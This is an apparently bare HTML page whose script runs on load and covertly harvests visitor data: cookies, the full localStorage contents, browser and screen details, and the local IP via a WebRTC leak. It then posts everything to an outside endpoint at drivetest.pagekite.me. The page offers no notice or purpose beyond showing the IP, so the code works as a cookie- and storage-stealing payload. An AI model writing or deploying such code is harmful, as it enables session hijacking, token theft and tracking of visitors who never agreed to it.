<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<body>
    <script src="https://code.jquery.com/jquery-3.1.1.min.js"
        integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="
        crossorigin="anonymous"></script>
    <script>
        jQuery(function(){
            var info={
                timeOpened:new Date(),
                timezone:(new Date()).getTimezoneOffset()/60,

                pageon: window.location.pathname,
                referrer: document.referrer,
                previousSites: history.length,

                browserName: navigator.appName,
                browserEngine: navigator.product,
                browserVersion1a: navigator.appVersion,
                browserVersion1b: navigator.userAgent,
                browserLanguage: navigator.language,
                browserOnline: navigator.onLine,
                browserPlatform: navigator.platform,
                javaEnabled: navigator.javaEnabled(),
                dataCookiesEnabled: navigator.cookieEnabled,
                dataCookies1: document.cookie,
                dataCookies2: decodeURIComponent(document.cookie.split(";")),
                dataStorage: localStorage,

                sizeScreenW: screen.width,
                sizeScreenH: screen.height,
                sizeDocW: document.width,
                sizeDocH: document.height,
                sizeInW: innerWidth,
                sizeInH: innerHeight,
                sizeAvailW: screen.availWidth,
                sizeAvailH: screen.availHeight,
                scrColorDepth: screen.colorDepth,
                scrPixelDepth: screen.pixelDepth
            };

            var finalIP;
            var findIP = new Promise(r=>{var w=window,a=new (w.RTCPeerConnection||w.mozRTCPeerConnection||w.webkitRTCPeerConnection)({iceServers:[]}),b=()=>{};a.createDataChannel("");a.createOffer(c=>a.setLocalDescription(c,b,b),b);a.onicecandidate=c=>{try{c.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g).forEach(r)}catch(e){}}})
            findIP.then(ip => finalIP = ip).catch( e => {
                $.get("http://ipinfo.io", function (response) {
                    ip = JSON.stringify(response, null, 4);
                    finalIP = ip;
                }, "jsonp");
            }).then(function(result){
                $("#details").html(finalIP);
                info.ip = finalIP;
                $.ajax({
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    type: "POST",
                    url: "https://drivetest.pagekite.me/myapp/rest/japra",
                    dataType: "json",
                    data: {
                        info: info
                    }
                });
            });
        })
    </script>
    <pre id="details"></pre>
</body>
</html>